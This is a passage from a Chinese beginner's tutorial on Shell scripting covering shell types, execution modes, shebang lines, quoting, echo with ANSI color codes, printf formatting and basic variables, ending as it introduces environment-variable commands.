pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Shell入门指南</h2>
<pre><code class="hljs">███████╗██╗  ██╗███████╗██╗     ██╗
██╔════╝██║  ██║██╔════╝██║     ██║
███████╗███████║█████╗  ██║     ██║
╚════██║██╔══██║██╔══╝  ██║     ██║
███████║██║  ██║███████╗███████╗███████╗
</code></pre>
<h3 data-id="heading-1">Shell简介</h3>
<h4 data-id="heading-2">shell</h4>
<p>Shell 本质上是一个用 C 语言编写的程序，它是连接用户与 Linux/Unix 操作系统内核的<strong>核心桥梁</strong>。对于开发者而言，Shell 具有不可替代的“双重人格”：</p>
<ul>
<li>作为<code>命令语言解释器</code>：它为用户提供了访问操作系统内核服务的交互界面。当你输入命令（如 ls, grep）时，Shell 负责解释这些指令并传递给内核执行</li>
<li>作为<code>程序设计语言</code>：Shell 拥有一套完整的编程语法（变量、循环、条件判断等）。我们将由 Shell 语法编写的程序称为<code>Shell Script</code>，这也是我们在开发和运维中常说的“写 Shell”</li>
</ul>



































<table><thead><tr><th/><th>Shell</th><th>Shell Script</th></tr></thead><tbody><tr><td><strong>本质</strong></td><td>命令解释器 / 运行环境</td><td>文本文件 / 逻辑代码集合</td></tr><tr><td><strong>核心职责</strong></td><td>接收指令、调用内核、反馈结果</td><td>编排指令、处理逻辑、实现自动化</td></tr><tr><td><strong>交互模式</strong></td><td>实时交互（Read-Eval-Print Loop）</td><td>批处理执行（编写 -&gt; 运行）</td></tr><tr><td><strong>示例</strong></td><td><code>bash</code>、<code>zsh</code>、<code>sh</code></td><td><code>install.sh</code>、<code>backup.sh</code></td></tr><tr><td><strong>依赖关系</strong></td><td>脚本运行的<strong>宿主/解释器</strong></td><td>Shell 能力的<strong>扩展/载体</strong></td></tr></tbody></table>
<h4 data-id="heading-3">Shell环境</h4>
<p>Shell 环境并非单纯的一个“黑色窗口”，它是操作系统为用户分配的一个<strong>运行时上下文 (Runtime Context)</strong>。这个上下文决定了命令如何被解析、资源如何被分配以及进程如何被管理</p>
<p>一个完整的 Shell 运行环境通常由以下核心模块构成：</p>
<ul>
<li><code>命令解释器</code>：负责解析和执行用户输入的命令</li>
<li><code>环境变量</code>：定义系统运行时行为的全局键值对，决定了命令搜索路径、用户身份及语言环境等</li>
<li><code>配置文件</code>：控制 Shell 启动时的初始化行为，分为“登录/非登录”和“交互/非交互”加载模式</li>
<li><code>用户自定义</code>：包括别名alias、函数和快捷方式</li>
</ul>
<p>编写 Shell 脚本并不需要特殊的 IDE，任何文本编辑器（Vim/VSCode）配合一个解释器即可。虽然 Linux 系统中存在多种 Shell，但主流阵营主要分为四大类：</p>






























<table><thead><tr><th>Shell</th><th>全称</th><th>特点</th></tr></thead><tbody><tr><td>sh</td><td>Bourne Shell</td><td>Unix 标准默认 shell，<strong>遵循 POSIX 标准</strong>，兼容性好，基础广泛</td></tr><tr><td><code>bash</code></td><td>Bourne Again Shell</td><td>Linux 标准默认 shell，功能丰富，兼容 sh，支持脚本编程</td></tr><tr><td>fish</td><td>Friendly Interactive Shell</td><td>用户友好，智能自动补全，语法高亮，开箱即用</td></tr><tr><td>zsh</td><td>Z Shell</td><td>macOS 的默认 Shell。完全兼容 Bash，但在自动补全、主题插件（如 Oh My Zsh）方面拥有极致体验，是开发者桌面的首选</td></tr></tbody></table>
<blockquote>
<p>在大多数现代 Linux 系统（如CentOS/Ubuntu）中，<code>/bin/sh</code>往往只是一个指向<code>/bin/bash</code>的符号链接</p>
<p>当通过<code>sh script.sh</code>运行脚本时，Bash 会以<strong>POSIX 兼容模式</strong>启动，此时它会关闭部分 Bash 特有的扩展功能（如<code>[[...]]</code>条件判断），以模仿老式 Bourne Shell 的行为。这也是为什么有时候同一段脚本用 bash 跑没问题，用 sh 跑却报错的原因</p>
</blockquote>
<h4 data-id="heading-4">Shell模式</h4>
<p>Shell 的运作模式从根本上取决于其<strong>命令读取来源</strong>。根据交互形式的不同，可以划分为<code>交互模式</code>和<code>非交互模式</code></p>
<h5 data-id="heading-5">交互模式</h5>
<p>用户登录终端后的默认模式。Shell 作为一个<strong>REPL（Read-Eval-Print Loop）环境</strong>运行</p>
<ol>
<li><strong>Read</strong>：从标准输入（Stdin）等待用户键入命令</li>
<li><strong>Eval</strong>：解析并执行命令</li>
<li><strong>Print</strong>：将结果输出到终端（Stdout）</li>
<li><strong>Loop</strong>：再次显示提示符（Prompt），等待下一条指令</li>
</ol>
<p>可以将Shell的交互模式简单理解为执行命令行。以下即为处于交互模式下</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 典型的交互式提示符（PS1变量定义）</span>
user@host:~$
<span class="hljs-comment"># 此时可直接输入 ls, top, docker ps 等命令</span>
</code></pre>
<h5 data-id="heading-6">非交互模式</h5>
<p>Shell 脚本运行时的典型模式（批处理模式）。此模式下，Shell <strong>不与用户进行实时交互</strong>，而是从文件或管道中读取一系列命令</p>
<ul>
<li><code>生命周期</code>：Shell 读取文件 -&gt; 按顺序执行命令 -&gt; 执行完毕后 Shell 进程自动终止 -&gt; 控制权返回父进程</li>
</ul>
<p>编写完脚本文件（如 script.sh）后，如何运行它是很多新手容易混淆的地方。执行方式不仅决定了权限需求，更决定了代码运行的<strong>进程作用域</strong></p>
<p><strong>方式一</strong>：解释器参数执行（Fork 子进程）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 直接调用 Shell 程序（如 bash 或 sh），将脚本路径作为参数传递</span>
bash script.sh
sh script.sh

<span class="hljs-comment"># 当前 Shell 启动一个新的 子 Shell 进程来解析脚本</span>
<span class="hljs-comment"># 脚本文件本身不需要执行权限（x），只需有读取权限（r）</span>
</code></pre>
<p><strong>方式二</strong>：直接路径执行（Fork 子进程）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将脚本作为可执行程序直接运行</span>
<span class="hljs-built_in">chmod</span> +x script.sh  <span class="hljs-comment"># 必须先赋予执行权限</span>
./script.sh

<span class="hljs-comment"># Shell 依然会 Fork 一个子进程。解释器由脚本第一行的 Shebang 决定</span>
<span class="hljs-comment"># 必须拥有 r 和 x 权限</span>
</code></pre>
<p><strong>方式三</strong>：Sourcing 执行（当前进程）</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 source 或其别名 . 来加载脚本</span>
<span class="hljs-built_in">source</span> script.sh
<span class="hljs-comment"># 点与文件名之间有空格</span>
. script.sh

<span class="hljs-comment"># 不启动子进程，直接在当前 Shell 环境中逐行执行脚本内容</span>
<span class="hljs-comment"># 脚本内定义的变量、函数会直接“污染”当前终端环境；脚本内的 exit 命令会导致当前终端窗口直接关闭</span>
</code></pre>
<p>三种方式总结如下：</p>









































<table><thead><tr><th>方式</th><th>典型指令</th><th>进程归属</th><th>变量作用域</th><th>权限依赖</th><th>Shebang</th><th>核心用途</th></tr></thead><tbody><tr><td><strong>解释器执行</strong></td><td><code>bash file.sh</code></td><td><strong>子进程</strong></td><td>隔离（结束后释放）</td><td>读取（Read）</td><td>被忽略</td><td>临时运行、调试</td></tr><tr><td><strong>直接执行</strong></td><td><code>./file.sh</code></td><td><strong>子进程</strong></td><td>隔离（结束后释放）</td><td>读+执行 （R+X）</td><td><strong>依赖</strong></td><td>标准化脚本</td></tr><tr><td><strong>内建加载</strong></td><td><code>source file.sh</code></td><td><strong>当前进程</strong></td><td><strong>保留</strong>（污染环境）</td><td>读取（Read）</td><td>无视</td><td>环境配置、库加载</td></tr></tbody></table>
<h3 data-id="heading-7">基本语法</h3>
<h4 data-id="heading-8">解释器</h4>
<p>Shell 脚本的第一行通常包含一个特殊的字符序列<code>#!</code>，技术术语称为<strong>Shebang</strong>（或 Hashbang）。它不仅是一行注释，更是写给<strong>操作系统内核</strong>看的“指令”，告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 解释器</p>
<p>在 Shell 中，你会见到诸如以下的注释：</p>
<ul>
<li>硬编码路径</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#!/usr/bin/python</span>
</code></pre>
<p>直接指定解释器的绝对路径，但移植性差，一旦路径不匹配，脚本直接报错<code>File not found</code></p>
<ul>
<li>动态查找</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/usr/bin/env bash</span>
<span class="hljs-comment">#!/usr/bin/env python3</span>
</code></pre>
<p><code>env</code>会根据当前用户的环境变量<code>PATH</code>，自动查找第一个匹配的程序，此种方式最为推荐</p>
<h4 data-id="heading-9">注释</h4>
<p>各种语言都有对应的注释语法，Shell语法中，注释是特殊的语句，会被Shell解释器忽略</p>
<ul>
<li>单行注释：以<code>#</code>开头，到行尾结束</li>
<li>多行注释：以<code>:&lt;&lt;EOF</code>开头，到<code>EOF</code>结束</li>
</ul>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'这是单行注释'</span></span>

:&lt;&lt;EOF
echo '这是多行注释'
echo '这是多行注释'
echo '这是多行注释'
EOF
</code></pre>
<h4 data-id="heading-10">引号</h4>





















<table><thead><tr><th>引号</th><th>含义</th></tr></thead><tbody><tr><td>单引号</td><td>所见即所得，单引号里面内容原封不动输出</td></tr><tr><td>双引号</td><td>双引号内的字符串会进行<strong>变量替换</strong>和<strong>转义处理</strong> ，但不会执行命令替换，不解析{}和通配符</td></tr><tr><td>反引号</td><td>优先执行，先执行反引号里面的命令，会进行命令替换</td></tr></tbody></table>
<p>在双引号中，变量引用或者命令置换是会被展开的。在单引号中不会</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"Your home: <span class="hljs-variable">$HOME</span>"</span> <span class="hljs-comment"># Your home: /Users/&lt;username&gt;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'Your home: $HOME'</span> <span class="hljs-comment"># Your home: $HOME</span>
</code></pre>
<p>当局部变量和环境变量包含空格时，它们在引号中的扩展要格外注意</p>
<pre><code class="hljs language-bash" lang="bash">INPUT=<span class="hljs-string">"A string  with   strange    whitespace."</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$INPUT</span>   <span class="hljs-comment"># A string with strange whitespace.</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$INPUT</span>"</span> <span class="hljs-comment"># A string  with   strange    whitespace.</span>
</code></pre>
<h4 data-id="heading-11">echo</h4>
<h5 data-id="heading-12">基本使用</h5>
<p><code>echo</code>用于在shell中打印shell变量的值，或者直接输出指定的字符串，在shell编程中极为常用</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> [Option] [String]

-e：启用转义字符
-E：不启用转义字符（默认）
-n：结尾不换行，默认情况下 <span class="hljs-built_in">echo</span> 会在末尾追加一个 \n
</code></pre>
<ul>
<li>不使用转义字符</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 默认情况下，echo输出结果自带换行符\n</span>
name=world
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, world"</span> <span class="hljs-comment"># hello, world</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, \"world\""</span> <span class="hljs-comment"># hello, "world"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, \"<span class="hljs-variable">${name}</span>\""</span> <span class="hljs-comment"># hello, "world"</span>

<span class="hljs-comment"># 输出含换行符的字符串</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"YES\nNO"</span> <span class="hljs-comment"># YES\nNO</span>

<span class="hljs-comment"># 输出重定向到文件</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"test"</span> &gt; test.txt

<span class="hljs-comment"># 输出执行结果</span>
<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">pwd</span>` <span class="hljs-comment"># (当前目录路径)</span>
</code></pre>
<ul>
<li>使用转义字符</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"YES\nNO"</span> <span class="hljs-comment"># -e 开启转义</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  YES</span>
<span class="hljs-comment">#  NO</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"YES\c"</span> <span class="hljs-comment"># -e 开启转义 \c 不换行</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"NO"</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  YESNO</span>
</code></pre>
<h5 data-id="heading-13">进阶使用</h5>
<p>控制echo输出文字的颜色</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"控制序列1文本内容控制序列2"</span>

<span class="hljs-comment"># 控制序列组成</span>
\e[样式代码1;样式代码2;前景色代码;背景色代码m
</code></pre>
<p>以<code>echo -e "\e[1;31mThis is red text\e[0m"</code>为例</p>
<ul>
<li><code>\e</code>：等同于<code>\033</code>，表示 ANSI 转义字符的起始（Escape 字符）</li>
<li><code>[</code>：紧跟<code>\e</code>后，表示进入控制序列模式</li>
<li><code>1;31m</code>：1为样式代码，31为前景色代码，m表示控制序列结束</li>
<li><code>\e[0m</code>：0表示重置所有属性，m表示结束控制序列</li>
</ul>
<p>以上命令，终端会输出<strong>加粗的红色文本</strong> <code>This is red text</code>，随后颜色和样式恢复默认</p>































































































































































































<table><thead><tr><th>类型</th><th>代码</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>样式代码</td><td>0</td><td>重置所有属性（颜色、加粗、下划线等）</td><td>\e[0m</td></tr><tr><td/><td>1</td><td>加粗/高亮文本</td><td>\e[1;31m（红色加粗）</td></tr><tr><td/><td>4</td><td>下划线文本</td><td>\e[4mUnderline\e[0m</td></tr><tr><td/><td>5</td><td>闪烁文本（闪烁频率由终端决定）</td><td>\e[5;31mFlashing Red\e[0m</td></tr><tr><td/><td>7</td><td>反转颜色（交换前景色和背景色）</td><td>\e[7;30;47mInverted\e[0m</td></tr><tr><td/><td>8</td><td>隐藏文本（部分终端支持）</td><td>\e[8mHidden Text\e[0m</td></tr><tr><td/><td>22</td><td>取消加粗（恢复默认粗细）</td><td>\e[22mNormal Text\e[0m</td></tr><tr><td/><td>24</td><td>取消下划线</td><td>\e[24mNo Underline\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>前景色代码</td><td>30</td><td>黑色</td><td>\e[30mBlack Text\e[0m</td></tr><tr><td/><td>31</td><td>红色</td><td>\e[31mRed Text\e[0m</td></tr><tr><td/><td>32</td><td>绿色</td><td>\e[32mGreen Text\e[0m</td></tr><tr><td/><td>33</td><td>黄色</td><td>\e[33mYellow Text\e[0m</td></tr><tr><td/><td>34</td><td>蓝色</td><td>\e[34mBlue Text\e[0m</td></tr><tr><td/><td>35</td><td>紫色</td><td>\e[35mMagenta Text\e[0m</td></tr><tr><td/><td>36</td><td>青色</td><td>\e[36mCyan Text\e[0m</td></tr><tr><td/><td>37</td><td>白色</td><td>\e[37mWhite Text\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>背景色代码</td><td>40</td><td>黑色背景</td><td>\e[40;37mBlack BG\e[0m</td></tr><tr><td/><td>41</td><td>红色背景</td><td>\e[41;37mRed BG\e[0m</td></tr><tr><td/><td>42</td><td>绿色背景</td><td>\e[42;30mGreen BG\e[0m</td></tr><tr><td/><td>43</td><td>黄色背景</td><td>\e[43;30mYellow BG\e[0m</td></tr><tr><td/><td>44</td><td>蓝色背景</td><td>\e[44;37mBlue BG\e[0m</td></tr><tr><td/><td>45</td><td>紫色背景</td><td>\e[45;37mMagenta BG\e[0m</td></tr><tr><td/><td>46</td><td>青色背景</td><td>\e[46;30mCyan BG\e[0m</td></tr><tr><td/><td>47</td><td>白色背景</td><td>\e[47;30mWhite BG\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>扩展功能</td><td>38;2;r;g;b</td><td>自定义前景色（RGB，r/g/b为0-255）</td><td>\e[38;2;255;0;0mCustom Red\e[0m</td></tr><tr><td/><td>48;2;r;g;b</td><td>自定义背景色（RGB，r/g/b为0-255）</td><td>\e[48;2;0;0;255;37mCustom Blue BG\e[0m</td></tr><tr><td/><td>5m</td><td>闪烁（与样式代码 5 相同）</td><td>\e[31;5mFlashing Red\e[0m</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[1;4;5;31;47m紧急状态\e[0m"</span> <span class="hljs-comment"># 输出闪烁的 带有下划线的 白色背景的 红色文字</span>
</code></pre>
<h4 data-id="heading-14">printf</h4>
<p>printf 是 Shell 中用于格式化输出的命令。与 echo 不同，printf 来源于 C 语言标准库，遵循 <strong>POSIX 标准</strong>，因此它具有更好的<strong>跨平台兼容性</strong>（不会因为 OS 不同而导致行为诡异）和更强大的<strong>文本排版能力</strong></p>
<p>其特点主要有：</p>
<ul>
<li><strong>不自动换行</strong>：printf 不会在结尾默认添加<code>\n</code>，你需要显式地在<code>FORMAT</code>字符串中控制换行</li>
<li><strong>格式与参数分离</strong>：前面是“模版”，后面是“数据”</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">printf</span> FORMAT [ARGUMENT]...
</code></pre>
<p>常见格式替换符</p>



































<table><thead><tr><th>占位符</th><th>含义</th><th>备注</th></tr></thead><tbody><tr><td><strong>%s</strong></td><td><strong>字符串</strong> (String)</td><td>最常用</td></tr><tr><td><strong>%d</strong></td><td><strong>十进制整数</strong> (Decimal)</td><td>如果参数是小数会被截断，是非数字字符则报错或显示为0</td></tr><tr><td><strong>%f</strong></td><td><strong>浮点数</strong> (Float)</td><td>默认保留6位小数，可通过 %.2f 控制精度</td></tr><tr><td>%b</td><td>转义字符串</td><td>会解析参数中的转义序列（如 \n, \t）</td></tr><tr><td>%x</td><td>十六进制数</td><td>常用于数值转换</td></tr></tbody></table>
<p>常见转义字符</p>



































<table><thead><tr><th>序列</th><th>含义</th><th>场景</th></tr></thead><tbody><tr><td><strong>\n</strong></td><td><strong>换行</strong></td><td>几乎每条指令末尾都必须加</td></tr><tr><td><strong>\t</strong></td><td><strong>水平制表符 (Tab)</strong></td><td>用于简易的列对齐</td></tr><tr><td>\</td><td>反斜杠本身</td><td>输出路径时常用</td></tr><tr><td>\r</td><td>回车 (CR)</td><td>光标回到行首（常用于覆盖当前行实现简易进度条）</td></tr><tr><td>\0ddd</td><td>八进制字节</td><td>输出特殊 ASCII 字符</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 单引号</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">'%d %s\n'</span> 1 <span class="hljs-string">"abc"</span>
<span class="hljs-comment">#  Output:1 abc</span>

<span class="hljs-comment"># 双引号</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%d %s\n"</span> 1 <span class="hljs-string">"abc"</span>
<span class="hljs-comment">#  Output:1 abc</span>

<span class="hljs-comment"># 无引号</span>
<span class="hljs-built_in">printf</span> %s abcdef
<span class="hljs-comment">#  Output: abcdef(并不会换行)</span>

<span class="hljs-comment"># 格式只指定了一个参数，但多出的参数仍然会按照该格式输出</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s\n"</span> abc def
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  abc</span>
<span class="hljs-comment">#  def</span>

<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s %s %s\n"</span> a b c d e f g h i j
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  a b c</span>
<span class="hljs-comment">#  d e f</span>
<span class="hljs-comment">#  g h i</span>
<span class="hljs-comment">#  j</span>

<span class="hljs-comment"># 如果没有参数，那么 %s 用 NULL 代替，%d 用 0 代替</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%s and %d \n"</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#   and 0</span>

<span class="hljs-comment"># 格式化输出</span>
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4s\n"</span> 姓名 性别 体重kg
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> 郭靖 男 66.1234
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> 杨过 男 48.6543
<span class="hljs-built_in">printf</span> <span class="hljs-string">"%-10s %-8s %-4.2f\n"</span> 郭芙 女 47.9876
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  姓名     性别   体重kg</span>
<span class="hljs-comment">#  郭靖     男      66.12</span>
<span class="hljs-comment">#  杨过     男      48.65</span>
<span class="hljs-comment">#  郭芙     女      47.99</span>
</code></pre>
<blockquote>
<p>日常简单输出用<code>echo</code>即可；但在需要严格控制对齐（如打印表格）或处理特殊格式时，<code>printf</code>是不可替代的神器</p>
</blockquote>
<h3 data-id="heading-15">变量</h3>
<p>Bash 中没有数据类型，变量可以保存一个数字、一个字符、一个字符串等。同时无需提前声明变量，给变量赋值会直接创建变量</p>
<ul>
<li>只能使用英文字母，数字和下划线，且不能以数字开头</li>
<li><strong>变量名和等号之间不能有空格</strong>（<code>name = value</code>是错的）</li>
<li>不能使用 bash 里的关键字（help 命令查看保留关键字）</li>
<li>可以使用驼峰（personOfName）或者现代式（person_of_name）</li>
</ul>
<p>访问变量的语法形式为：<code>${var}</code>和<code>$var</code>。花括号是为了帮助解释器识别变量的边界，推荐使用<code>${var}</code></p>
<pre><code class="hljs language-bash" lang="bash">word=<span class="hljs-string">"hello"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">${word}</span> <span class="hljs-comment"># hello</span>
</code></pre>
<p>变量赋值方法有很多，以下为常用的赋值方式：</p>

























<table><thead><tr><th>赋值方法</th><th>格式</th></tr></thead><tbody><tr><td>直接赋值</td><td>name=zhangsan</td></tr><tr><td>命令结果赋值</td><td>path=`pwd`</td></tr><tr><td>脚本传参</td><td>user_name=$1</td></tr><tr><td>read交互式赋值（不常用）</td><td><code>-p</code>：交互时提示信息<br/><code>-t</code>：超过时间没操作则自动退出<br/><code>-s</code>：不显示用户的输入</td></tr></tbody></table>
<h4 data-id="heading-16">变量类型</h4>
<ul>
<li><strong>局部变量</strong>：在当前 Shell 进程或脚本中定义的变量，仅在当前进程有效。不会被子 Shell 或子脚本继承</li>
<li><strong>环境变量</strong>： export 导出的变量，在当前进程及其产生的所有子进程中有效</li>
<li><strong>Shell特殊变量</strong>：由 Shell 程序（如 bash）启动时自动设置的只读或读写变量，用于维持 Shell 的运行</li>
</ul>
<h5 data-id="heading-17">环境变量</h5>
<p>常见的环境变量：</p>

























































<table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>$HOME</code></td><td>当前用户的用户目录</td></tr><tr><td><code>$LANG</code></td><td>系统语言与字符集</td></tr><tr><td><code>$PATH</code></td><td>记录<strong>命令位置</strong>的环境变量，运行命令的时候bash会在PATH的路径中查找</td></tr><tr><td><code>$PWD</code></td><td>当前工作目录</td></tr><tr><td><code>$UID</code></td><td>数值类型，当前用户的用户 ID</td></tr><tr><td><code>$PS1</code></td><td>命令行的主提示符，用户在终端输入命令时看到的默认提示符</td></tr><tr><td><code>$PS2</code></td><td>辅助提示符，用于多行命令输入时的提示</td></tr><tr><td>$RANDOM</td><td>0~32767之间的整数</td></tr><tr><td>$HISTSIZE</td><td>history 命令记录命令上限</td></tr><tr><td>$HISTFILESIZE</td><td>history 历史记录文件的大小</td></tr><tr><td>$HISTCONTROL</td><td>控制历史命令记录或不记录哪些内容</td></tr><tr><td>$HISTFILE</td><td>指定历史命令的记录文件</td></tr></tbody></table>
<blockquote>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ftldp.org%2FLDP%2FBash-Beginners-Guide%2Fhtml%2Fsect_03_02.html%23%23%23sect_03_02_04" target="_blank" title="http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_02.html###sect_03_02_04" ref="nofollow noopener noreferrer">这里</a> 有一张更全面的 Bash 环境变量列表</p>
</blockquote>
<p>在 Shell 中，与环境变量相关的常用关键字及命令如下</p>






























